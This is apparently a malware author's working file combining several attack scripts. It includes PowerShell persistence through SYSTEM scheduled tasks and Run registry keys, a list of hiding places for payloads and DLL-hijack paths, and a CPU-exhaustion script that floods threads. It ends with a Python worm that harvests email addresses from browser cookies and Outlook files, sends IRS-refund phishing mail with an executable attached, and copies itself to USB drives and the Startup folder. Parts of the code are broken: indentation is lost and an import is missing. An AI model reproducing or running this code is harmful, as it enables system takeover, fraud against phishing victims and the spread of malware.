# Create task scheduler Value
schtasks /create /tn "CheckRegistryAtStartup" /tr "powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1" /sc onstart /ru SYSTEM /rl HIGHEST /f

# Set Registry Value
$command = "powershell.exe -w hidden -noP -c 'Start-Sleep -Seconds 10;schtasks /create /tn CheckRegistryAtStartup /tr ''powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1'' /sc onstart /ru SYSTEM /rl HIGHEST /f'"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "CheckRegistryAtStartup" -Value $command


# Auto-Elevate.ps1 Code
# This script will be placed in one of the path as this one is important for monitoring the task scheduler
(take consideration of these Paths to store payloads)
* C:\Windows\system32\config\systemprofile\AppData\Local  
* C:\Windows\System32
* C:\Windows\System32\GroupPolicy\User\Scripts\logon 
* C:\Recovery
â•š Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\dotnet\

### BEGIN
# Path to the script to be executed
$scriptPath = "$env:USERPROFILE\Downloads\gg.ps1"                                   

# Check if the script is running with elevated privileges (admin rights, for now)
$isElevated = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'

if (-not $isElevated) {
    # Relaunch the script with elevated privileges with prompts (for now)
    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

# Code to create the scheduled task if needed
$taskName = "CheckRegistryAtStartup"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {
    # If the task doesn't exist, create it
    schtasks /create /tn $taskName /tr "powershell.exe -NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onstart /ru SYSTEM /rl HIGHEST /f
}

$basePath = '\\?\HKCU\Software\Classes\CLSID\{52061390-E7D9-4F25-B2FE-A3FDE42BFA96}\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN'
$propertyName = "YourProperty"
$rootMonScript = "C:\YourPath\root_mon.ps1"

# Use reg add to add the property
Invoke-Expression "reg add `"$basePath`" /v `"$propertyName`" /t REG_SZ /d `"$rootMonScript`" /f"




if (-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    Start-Process powerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

#+Hijack+the+scheduler+using+undocumented+NTAPI+calls+(because+we're+evil+engineers)++
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class NtAPI{
    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref uint ProcessInformation, int ProcessInformationLength);
}
'@

#+Enable+PROCESS_BASE_PRIORITY_ABOVE_NORMAL++(0x12)+-+fuck+the+scheduler's+limits++
$priorityBoost=0x12
[NtAPI]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$priorityBoost,4)

#+Bind+ALL+cores+and+disable+processor+idle+states++
$MainProcess=Get-Process -Id $pid
$MainProcess.ProcessorAffinity=0xFFFF
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLESTATE 0 #No rest for the wicked

#+Spawn+nested+threads+with+THREAD_PRIORITY_TIME_CRITICAL+(highest+possible)++
function Invoke-KernelAnnihilator{
param($Depth)
[System.Threading.Thread]::CurrentThread.Priority='Highest'
while($true){
#+Layer+1:+Brute-force+elliptic+curve+crypto+cracking
$curve=[System.Security.Cryptography.ECDsa]::Create()
1..1000000|%{$curve.SignData([BitConverter]::GetBytes($_))|Out-Null}
#+Layer+2:+Real-time+ray+tracing+without+GPU++
1..1000000|%{
$ray=New-Object System.Numerics.Vector3($_%1000,$_%500,$_%200)
$intersection=[System.Numerics.Vector3]::Reflect($ray,[System.Numerics.Vector3]::UnitX)
}
#+Layer+3:+Spawn+sub-threads+with+inherited+priority++
if($Depth -lt 50){
Start-ThreadJob -ScriptBlock{
    param($D) 
    Invoke-KernelAnnihilator -Depth ($D+1)
} -ArgumentList+$Depth
}
}
}

#+Overcommit+threads+at+a+1000:1+ratio+to+logical+cores++
1..([System.Environment]::ProcessorCount*1000)|%{
Start-ThreadJob -ScriptBlock {Invoke-KernelAnnihilator -Depth 1}
}

#+Disable+interrupts+by+flooding+the+CPU+with+spinlocks++
while($true){
[System.Threading.SpinWait]::SpinUntil({$false},[TimeSpan]::MaxValue)
}

1..10000000 | % {
[math]::Sin([math]::PI * $_) + [math]::Sqrt($_)
# No Sleep(), no mercyâ€”pure thread-lock
} 

# Last CPU_HOG Script on `mem_hog mod` commit




import os
import sqlite3
import smtplib
import shutil
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# STEP 1: STEAL EVERY EMAIL IN SIGHT
def harvest_emails():
emails = set()
# Pillage Chrome's cookies
chrome_path = os.path.expanduser(f"~/.config/google-chrome/Default/Cookies")
if os.path.exists(chrome_path):
conn = sqlite3.connect(chrome_path)
cursor = conn.cursor()
cursor.execute("SELECT value FROM cookies WHERE name LIKE '%@%'")
emails.update(row[0] for row in cursor.fetchall())
conn.close()

# Raid Outlook PST files (crude example)
for root, dirs, files in os.walk(os.path.expanduser("~")):
for file in files:
if file.endswith(".pst"):
with open(os.path.join(root, file), 'r', errors='ignore') as f:
content = f.read()
emails.update(re.findall(r'[\w\.-]+@[\w\.-]+', content))

return list(emails)

# STEP 2: SPAM LIKE A PSYCHOPATH
def send_spam(email_list):
smtp_server = "smtp.gmail.com"
smtp_port = 587
attacker_email = "hacked.account@gmail.com"
attacker_password = "St0l3nP@ssw0rd!"

msg = MIMEMultipart()
msg['From'] = "IRS Support <irs-refund@verify.gov>"
msg['Subject'] = "ACTION REQUIRED: $9,852 Tax Refund Approved! ðŸ’µ"
body = "Click to claim your refund. Document attached."
msg.attach(MIMEText(body, 'plain'))

# Attach malware
with open("tax_refund.exe", "rb") as attachment:
part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename=refund.exe")
msg.attach(part)

server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(attacker_email, attacker_password)

for victim in email_list:
try:
msg['To'] = victim
server.sendmail(attacker_email, victim, msg.as_string())
except:
pass # Who cares about errors? Fuck 'em.
server.quit()

# STEP 3: REPLICATE LIKE A VIRUS
def infect_system():
# Spread to USB drives
for root, dirs, files in os.walk('/media'):
for dir_name in dirs:
target_path = os.path.join(root, dir_name, "Important_Document.exe")
shutil.copyfile(__file__, target_path)

# Add to startup
user = getpass.getuser()
startup_path = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/system_check.py"
shutil.copy(__file__, startup_path)

# MAIN EXECUTION (NO MERCY)
if __name__ == "__main__":
email_list = harvest_emails()
send_spam(email_list)
infect_system()
### END